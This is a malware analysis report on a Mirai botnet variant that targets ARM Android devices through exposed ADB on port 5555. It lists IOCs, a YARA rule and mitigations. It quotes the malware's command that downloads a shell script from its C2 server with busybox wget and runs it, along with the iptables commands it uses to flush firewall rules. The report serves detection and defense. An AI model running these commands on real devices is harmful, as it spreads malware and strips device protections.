# Mirai ARM Variant with ADB Exploitation (March 2026)

**Date:** March 2, 2026  
**Analysis Type:** IoT Malware  
**Family:** Mirai  
**Architecture:** ARM (32-bit)  
**Severity:** High  
**Source:** Peris.ai Threat Research

---

## Executive Summary

Fresh Mirai IoT botnet variant targeting ARM-based Android devices via ADB (Android Debug Bridge) exploitation. The malware demonstrates sophisticated capabilities including HTTP-based DDoS attacks, iptables manipulation for persistence, and automated propagation through ADB-enabled devices.

**Key Findings:**
- **C2 Infrastructure:** 130.12.180.151
- **Propagation:** ADB exploitation (port 5555/TCP) via busybox wget
- **Evasion:** iptables manipulation, process enumeration
- **Target:** ARM IoT devices, Android devices with ADB enabled

---

## Sample Information

**Hashes:**
- **SHA256:** `336687311750c9c8ec9483b664289c61a2869bbe68696c217e56f077a342551b`
- **SHA1:** `e94a8cd1060dd64907ede0763c90bf10e5ccbb17`
- **MD5:** `2adb3f60a38a226c21b51289d2680919`

**File Properties:**
- **Type:** ELF 32-bit LSB executable, ARM
- **Size:** 117,164 bytes (115 KB)
- **Compiler:** GCC 3.3.2 (2003)
- **Architecture:** ARM EABI0, statically linked, stripped
- **Protection:** None (no NX, canary, RELRO, PIE)

---

## Network IOCs

**Command & Control:**
- **IP Address:** `130.12.180.151` ⚠️
- **Payload URL:** `http://130.12.180.151/file/adb-shell.sh`
- **Target Port:** 5555/TCP (ADB)

**ADB Exploitation Command:**
```bash
shell:cd /data/local/tmp/; busybox wget http://130.12.180.151/file/adb-shell.sh; sh adb-shell.sh
```

---

## Behavioral Analysis

### HTTP DDoS Capabilities

The malware includes sophisticated HTTP request templating with User-Agent spoofing:

**User-Agent Strings:**
- `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0`
- `Mozilla/5.0 (Macintosh; Intel Mac OS X 15.7; rv:147.0) Gecko/20100101 Firefox/147.0`
- `Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0`

**HTTP Methods Supported:** POST, GET, HEAD, DELETE, OPTIONS, PATCH

### Firewall Evasion & Persistence

The malware manipulates iptables for persistence and evasion:
```bash
iptables -F                                # Flush all rules
iptables -X                                # Delete all chains
iptables -P INPUT ACCEPT                   # Allow all incoming
iptables -P FORWARD ACCEPT                 # Allow all forwarding
iptables -P OUTPUT ACCEPT                  # Allow all outgoing
iptables -A OUTPUT -d %s -j ACCEPT         # Whitelist C2
iptables -A INPUT -s %s -j ACCEPT          # Whitelist C2
```

### Process Enumeration

The malware enumerates system state via `/proc` filesystem:
- `/proc/net/tcp` and `/proc/net/tcp6` — active connections
- `/proc/%d/stat`, `/proc/%d/status` — running processes
- Socket enumeration via `socket:[%u]` pattern matching

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Description |
|--------|-----------|-------------|
| **Initial Access** | T1190 | Exploit Public-Facing Application (ADB) |
| **Execution** | T1059.004 | Command and Scripting Interpreter: Unix Shell |
| **Persistence** | T1562.004 | Impair Defenses: Disable or Modify System Firewall |
| **Defense Evasion** | T1562.004 | Disable or Modify System Firewall |
| **Defense Evasion** | T1036.005 | Masquerading: Match Legitimate Name or Location |
| **Discovery** | T1057 | Process Discovery |
| **Discovery** | T1049 | System Network Connections Discovery |
| **Command and Control** | T1071.001 | Application Layer Protocol: Web Protocols |
| **Impact** | T1498.001 | Network Denial of Service: Direct Network Flood |

---

## Indicators of Compromise

### Network IOCs

| Type | Indicator | Context |
|------|-----------|---------|
| IPv4 | `130.12.180.151` | C2 server |
| URL | `http://130.12.180.151/file/adb-shell.sh` | Payload delivery |
| Port | `5555/TCP` | ADB exploitation |

### File IOCs

| Hash Type | Value |
|-----------|-------|
| SHA256 | `336687311750c9c8ec9483b664289c61a2869bbe68696c217e56f077a342551b` |
| SHA1 | `e94a8cd1060dd64907ede0763c90bf10e5ccbb17` |
| MD5 | `2adb3f60a38a226c21b51289d2680919` |

### Behavioral IOCs

- ADB shell command: `shell:cd /data/local/tmp/`
- Busybox wget usage for payload delivery
- iptables flush/reset operations
- `/proc/net/tcp` enumeration
- Firefox 147.0 User-Agent strings

---

## YARA Rule

```yara
rule Mirai_ARM_ADB_Variant_Mar2026 {
    meta:
        description = "Detects Mirai ARM variant with ADB exploitation capability"
        author = "Peris.ai Threat Research"
        date = "2026-03-02"
        family = "Mirai"
        architecture = "ARM"
        severity = "high"
        sha256 = "336687311750c9c8ec9483b664289c61a2869bbe68696c217e56f077a342551b"
    
    strings:
        $c2_ip = "130.12.180.151"
        $adb_payload = "adb-shell.sh"
        $adb_cmd = "shell:cd /data/local/tmp/"
        $busybox = "busybox wget"
        $iptables = "iptables -F"
        $proc_tcp = "/proc/net/tcp"
        $user_agent = "Mozilla/5.0"
        $arch = "arm4"
        
    condition:
        uint32(0) == 0x464c457f and
        uint16(18) == 0x0028 and
        (
            ($c2_ip and $adb_payload) or
            ($adb_cmd and $busybox and $c2_ip) or
            (4 of them)
        )
}
```

---

## Mitigation Recommendations

### Immediate Actions

1. **Block C2 IP:** `130.12.180.151` at network perimeter
2. **Disable ADB:** On production Android/IoT devices
3. **Network Segmentation:** Isolate IoT devices from critical networks
4. **Firewall Rules:** Block port 5555/TCP inbound/outbound
5. **Monitor:** iptables modifications, /proc scanning activity

### Long-Term Hardening

1. **Patch Management:** Update Android/IoT firmware to latest versions
2. **ADB Security:** If ADB required, use authentication keys + restrict to localhost
3. **Network Monitoring:** Deploy IDS/IPS rules for Mirai variants
4. **Endpoint Detection:** Deploy YARA rules to detect Mirai families

---

## Affected Devices

- ARM Android IoT devices
- Smart TVs (Android TV)
- Set-top boxes
- Industrial Android controllers
- Any device with ADB debugging enabled on port 5555

---

## References

- **MalwareBazaar:** https://bazaar.abuse.ch/sample/336687311750c9c8ec9483b664289c61a2869bbe68696c217e56f077a342551b/
- **MITRE ATT&CK:** https://attack.mitre.org/
- **Peris.ai Threat Research:** https://peris.ai/

---

**Report Version:** 1.0  
**Classification:** TLP:WHITE (Public distribution)  
**Analysis Date:** March 2, 2026
